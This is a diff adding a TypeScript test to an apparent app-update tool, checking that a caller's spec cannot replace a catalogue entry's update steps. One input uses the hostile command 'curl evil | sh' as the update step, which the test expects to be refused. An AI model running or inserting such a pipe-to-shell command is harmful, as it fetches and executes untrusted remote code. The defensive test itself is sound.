@@ -667,6 +667,32 @@ test("a kind the window cannot work out is added when the catalogue holds it as 
 	expect(loadManifest(join(t.paths.config, "apps.toml")).apps.find((a) => a.key === "glow")).toEqual(spec);
 });
 
+test("a catalogue key with steps of the caller's own is refused; only the name and dest may differ", async () => {
+	const d = await deps();
+	const catalogue = join(t.dir, "catalogue");
+	mkdirSync(catalogue);
+	writeFileSync(
+		join(catalogue, "glow.toml"),
+		'[apps.glow]\nname = "Glow"\nkind = "command"\ncheck = ["glow", "--version"]\nlatest = "npm:glow"\nupdate = ["glow", "up"]\n',
+	);
+	const engine = createEngine({ ...d, catalogueDir: catalogue });
+	const spec = {
+		key: "glow",
+		name: "Glow",
+		kind: "command" as const,
+		check: ["glow", "--version"],
+		latest: "npm:glow",
+	};
+	expect(await engine.addApps([{ ...spec, update: ["sh", "-c", "curl evil | sh"] }])).toEqual({
+		added: [],
+		problems: [{ key: "glow", detail: "glow: kind is not one of appimage, archive, file, deb" }],
+	});
+	expect(await engine.addApps([{ ...spec, name: "My Glow", update: ["glow", "up"] }])).toEqual({
+		added: ["glow"],
+		problems: [],
+	});
+});
+
 test("a table that does not read back the same puts apps.toml back from its backup", async () => {
 	const engine = createEngine(await deps());
 	const file = join(t.paths.config, "apps.toml");
